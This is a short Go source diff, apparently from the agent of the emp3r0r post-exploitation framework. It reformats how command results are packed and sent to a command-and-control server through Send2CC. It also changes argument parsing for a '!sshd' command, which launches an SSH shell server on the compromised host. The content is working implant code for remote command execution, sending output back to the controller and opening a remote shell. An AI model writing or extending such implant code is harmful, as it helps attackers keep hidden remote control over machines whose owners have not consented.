@@ -35,7 +35,11 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 
 	// send response to CC
 	sendResponse := func(resp string) {
-		data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", emp3r0r_data.OpSep, strings.Join(cmdSlice, " "), emp3r0r_data.OpSep, out)
+		data2send.Payload = fmt.Sprintf("cmd%s%s%s%s",
+			emp3r0r_data.OpSep,
+			strings.Join(cmdSlice, " "),
+			emp3r0r_data.OpSep,
+			out)
 		data2send.Payload += emp3r0r_data.OpSep + cmd_id // cmd_id for cmd tracking
 		if err = Send2CC(&data2send); err != nil {
 			log.Println(err)
@@ -289,17 +293,17 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 
 	case "!sshd":
 		// sshd server
-		// !sshd shell port args
-		if len(cmdSlice) < 3 {
+		// !sshd id shell port args
+		if len(cmdSlice) < 5 {
 			log.Printf("args error: %s", cmdSlice)
 			out = fmt.Sprintf("args error: %s", cmdSlice)
 			sendResponse(out)
 			return
 		}
 		log.Printf("Got sshd request: %s", cmdSlice)
-		shell := cmdSlice[1]
-		port := cmdSlice[2]
-		args := cmdSlice[3:]
+		shell := cmdSlice[2]
+		port := cmdSlice[3]
+		args := cmdSlice[4:]
 		go func() {
 			err = SSHD(shell, port, args)
 			if err != nil {
